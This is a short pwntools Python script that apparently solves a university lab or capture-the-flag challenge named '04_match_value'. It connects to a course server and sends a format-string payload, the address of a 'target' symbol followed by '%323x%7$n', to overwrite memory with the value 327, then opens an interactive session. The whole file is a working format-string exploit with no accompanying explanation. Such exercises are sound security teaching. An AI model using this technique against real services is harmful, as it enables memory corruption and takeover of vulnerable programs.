from pwn import *

elf = ELF("04_match_value")
target_address = elf.symbols['target']

HOST = 'mustard.stt.rnl.tecnico.ulisboa.pt'
PORT = 23194

io = connect(HOST, PORT)

payload = p32(target_address) + b"%323x%7$n"  # 4 bytes on the target address + 323 bytes = 327 bytes which is the target

io.sendline(payload)
io.interactive()
